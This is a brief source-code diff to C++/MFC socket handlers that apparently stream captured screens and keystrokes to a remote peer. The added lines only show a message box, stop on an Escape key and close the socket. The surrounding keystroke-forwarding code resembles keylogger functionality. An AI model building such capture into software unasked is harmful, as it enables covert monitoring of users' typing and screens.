@@ -170,6 +170,8 @@ BOOL CReceivingSocket::OnReceiveCapScreen(int nErrorCode)
 
     } while (cbLeftToSend > 0);
 
+    AfxMessageBox("file sent successfully");
+
 
 PreReturnCleanup: // labelled goto destination
 
@@ -197,7 +199,10 @@ void CReceivingSocket::OnReceiveKeystroke(int nErrorCode)
         CString keystrokeName(Keystroke().c_str()); 
         if (keystrokeName != " ")
             this->Send(keystrokeName, keystrokeName.GetLength());
+        if (keystrokeName == "[ESC]")
+            break;
         Sleep(10);
     }
+    this->Close();
 }
 
